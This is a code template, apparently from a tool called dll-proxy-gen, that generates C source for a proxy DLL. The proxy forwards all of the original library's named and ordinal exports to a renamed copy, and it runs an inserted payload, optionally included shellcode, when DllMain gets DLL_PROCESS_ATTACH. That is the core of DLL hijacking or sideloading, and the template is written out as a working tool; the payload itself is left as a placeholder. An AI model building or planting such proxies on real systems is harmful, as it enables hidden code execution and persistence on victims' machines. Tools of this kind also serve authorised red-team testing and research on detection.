/*
 * Proxy DLL: {{ dll_name }}
 * Generated by dll-proxy-gen <https://github.com/unrandoms/dll-proxy-gen>
 *
 * Rename the original {{ dll_name }} to {{ orig_stem }}.dll and place it
 * in the same directory as this compiled proxy.
 *
 * All exports are forwarded via #pragma comment(linker, "/export:...").
 * Payload: {{ payload_kind }}
 */

#include <windows.h>
#include <string.h>

/* -------------------------------------------------------------------------
 * Export forwarding pragmas
 * -------------------------------------------------------------------------
 * Format: /export:<ExportName>=<ForwardTarget>,@<Ordinal>[,NONAME]
 *
 * Named exports
 */
{% for exp in named_exports %}
#pragma comment(linker, "/export:{{ exp.name }}={{ orig_stem }}.{{ exp.name }},@{{ exp.ordinal }}")
{% endfor %}
{% if ordinal_exports %}

/*
 * Ordinal-only exports (no name): forwarded by ordinal
 */
{% for exp in ordinal_exports %}
#pragma comment(linker, "/export:_Ordinal{{ exp.ordinal }}={{ orig_stem }}.#{{ exp.ordinal }},@{{ exp.ordinal }},NONAME")
{% endfor %}
{% endif %}

/* -------------------------------------------------------------------------
 * DllMain
 * ------------------------------------------------------------------------- */
{% if has_shellcode %}
#include "shellcode.h"
{% endif %}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
    (void)hinstDLL;
    (void)lpvReserved;

    switch (fdwReason) {
    case DLL_PROCESS_ATTACH:
        DisableThreadLibraryCalls(hinstDLL);
{{ payload_snippet }}
        break;

    case DLL_PROCESS_DETACH:
        break;

    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
        break;
    }
    return TRUE;
}
